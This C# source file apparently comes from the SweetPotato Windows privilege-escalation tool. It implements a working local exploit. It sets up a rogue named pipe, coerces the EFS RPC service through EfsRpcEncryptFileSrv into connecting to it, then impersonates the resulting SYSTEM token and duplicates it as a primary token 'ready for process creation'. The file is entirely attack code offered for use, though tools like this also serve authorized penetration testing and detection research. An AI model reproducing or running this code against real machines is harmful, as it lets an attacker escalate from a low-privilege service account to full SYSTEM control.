b'\xef\xbb\xbfusing NtApiDotNet.Ndr.Marshal;\r\nusing NtApiDotNet.Win32;\r\nusing rpc_df1941c5_fe89_4e79_bf10_463657acf44d_1_0;\r\nusing System;\r\nusing System.Collections.Generic;\r\nusing System.IO.Pipes;\r\nusing System.Linq;\r\nusing System.Text;\r\nusing System.Threading;\r\nusing System.Threading.Tasks;\r\n\r\nnamespace SweetPotato {\r\n    internal class EfsRpc {\r\n\r\n        string pipeName = Guid.NewGuid().ToString();\r\n\r\n        NamedPipeServerStream efsrpcPipe;\r\n        Thread efsrpcPipeThread;\r\n        IntPtr systemImpersonationToken = IntPtr.Zero;\r\n\r\n        public IntPtr Token { get {return systemImpersonationToken; } }\r\n\r\n        void EfsRpcPipeThread() {\r\n\r\n            byte[] data = new byte[4];\r\n\r\n            efsrpcPipe = new NamedPipeServerStream($"{pipeName}\\\\pipe\\\\srvsvc", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048);\r\n            efsrpcPipe.WaitForConnection();\r\n\r\n            Console.WriteLine("[+] Server connected to our evil RPC pipe");\r\n\r\n            efsrpcPipe.Read(data, 0, 4);\r\n\r\n            efsrpcPipe.RunAsClient(() => {\r\n                if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),\r\n                    ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle)) {\r\n                    Console.WriteLine("[-] Failed to open thread token");\r\n                    return;\r\n                }\r\n\r\n                if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,\r\n                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,\r\n                    ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken)) {\r\n                    Console.WriteLine("[-] Failed to duplicate impersonation token");\r\n                    return;\r\n                }\r\n                \r\n                Console.WriteLine("[+] Duplicated impersonation token ready for process creation");\r\n            });\r\n\r\n            efsrpcPipe.Close();\r\n        }\r\n\r\n        public EfsRpc() {\r\n            efsrpcPipeThread = new Thread(EfsRpcPipeThread);\r\n            efsrpcPipeThread.Start();\r\n        }\r\n\r\n        public void TriggerEfsRpc() {\r\n\r\n            string targetPipe = string.Format($"\\\\\\\\localhost/pipe/{pipeName}/\\\\{pipeName}\\\\{pipeName}");\r\n\r\n            Client c = new Client();\r\n\r\n            try\r\n            {\r\n                c.Connect();\r\n            }\r\n            catch (Exception)\r\n            {\r\n                Console.WriteLine($"[-] Failed to connect to RPC endpoint using ALPC transport, trying named pipes instead...");\r\n            }\r\n\r\n            if (c.Connected == false)\r\n            {\r\n                try\r\n                {\r\n                    NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity trsec = new NtApiDotNet.Win32.Rpc.Transport.RpcTransportSecurity();\r\n                    trsec.AuthenticationLevel = NtApiDotNet.Win32.Rpc.Transport.RpcAuthenticationLevel.PacketPrivacy;\r\n                    trsec.AuthenticationType = NtApiDotNet.Win32.Rpc.Transport.RpcAuthenticationType.Negotiate;\r\n\r\n                    c.Connect("ncacn_np", "\\\\pipe\\\\efsrpc", "localhost", trsec);\r\n                }\r\n                catch (Exception)\r\n                {\r\n                    Console.WriteLine($"[-] Failed to connect to RPC endpoint using named pipes transport.");\r\n                }\r\n            }\r\n\r\n            if (c.Connected)\r\n            {\r\n                Console.WriteLine($"[+] Triggering name pipe access on evil PIPE {targetPipe}");\r\n\r\n                c.EfsRpcEncryptFileSrv(targetPipe);\r\n                // More useful functions here https://twitter.com/tifkin_/status/1421225980161626112\r\n            }\r\n        }\r\n    }\r\n}\r\n'